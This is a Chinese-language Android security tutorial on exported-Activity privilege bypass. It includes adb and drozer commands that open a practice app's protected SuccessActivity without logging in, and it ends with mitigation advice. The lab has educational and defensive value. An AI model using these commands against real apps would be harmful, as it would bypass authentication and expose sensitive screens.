# Activity漏洞：越权绕过

### 原理

在Android系统中，Activity默认是不导出的，如果设置了`exported = "true"`这样的关键值或者是添加了`<intent-filter>`这样的属性，那么此时Activity是导出的，就会导致越权绕过或者是泄露敏感信息等安全风险。
例如：

-   一些敏感的界面需要用户输入密码才能查看，如果没有对调用此Activity的组件进行权限验证，就会造成验证的越权问题，导致攻击者不需要密码就可以打开
-   通过Intent给Activity传输畸形数据使得程序崩溃拒绝服务
-   对Activity界面进行劫持



### 实验步骤

绕过MainActivity的登录验证，直接访问受限的`SuccessActivity`。

#### 1. 编译安装、并运行该程序

只有当用户名为`admin`,密码为`123456`时，才会跳转到Success界面

#### 2. 越过登录页跳转到Success页

由于Success界面所属的`SuccessActivity`设置了`exported="true"`，导致可以被外部组件可访问。

##### 2.1 使用am命令

可直接输入命令

```bash
adb shell am start -D -n com.forgotten.activityoverpermission/com.forgotten.activityoverpermission.SuccessActivity
```

便可以直接来到`Success`界面

##### 2.2 使用dozer

```bash
dz> run app.package.attacksurface com.forgotten.activityoverpermission
Attack Surface:
  2 activities exported
  0 broadcast receivers exported
  0 content providers exported
  0 services exported
    is debuggable
dz> run app.activity.info -a com.forgotten.activityoverpermission
Package: com.forgotten.activityoverpermission
  com.forgotten.activityoverpermission.SuccessActivity
    Permission: null
  com.forgotten.activityoverpermission.MainActivity
    Permission: null

dz> run app.activity.start --component com.forgotten.activityoverpermission com.forgotten.activityoverpermission.SuccessActivity
```

也可以直接来到`Success`界面



### 如何防范

-   私有Activity是相对安全的，创建activity时，设置exported属性为false。
-   公开Activity应谨慎处理接收的Intent，有返回数据不包含敏感信息，不应发送敏感信息，收到返回数据谨慎处理。